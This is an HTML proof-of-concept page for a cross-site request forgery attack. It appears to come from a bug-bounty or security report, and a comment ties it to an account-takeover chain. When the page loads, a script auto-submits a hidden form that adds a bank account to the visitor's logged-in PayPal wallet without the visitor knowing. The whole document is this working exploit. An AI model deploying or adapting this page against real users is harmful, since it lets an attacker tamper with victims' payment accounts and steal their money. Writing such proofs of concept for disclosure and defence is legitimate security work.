<!--this file is unneeded to take over the account. may just be used as extra verification -->

<html>
<head>


<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.0/jquery.min.js"></script>

<script>
$(document).ready(function(){$("#bank").submit();});
 </script>
	
</head>
<body>
	<form id="bank" method="post" action="https://www.paypal.com/myaccount/wallet/saveBankInfo"/>
		<input type="hidden" name="bankName" value="Dummybank"/>
		<input type="hidden" name="country" value="AU"/>
		<input type="hidden" name="routingNumber" value="082"/>
		<input type="hidden" name="routingNumber2" value="918"/>
		<input type="hidden" name="accountNumber" value="91879491"/>
		<input type="hidden" name="routingNumber1" value="null"/>
	</form>
</body>
</html>
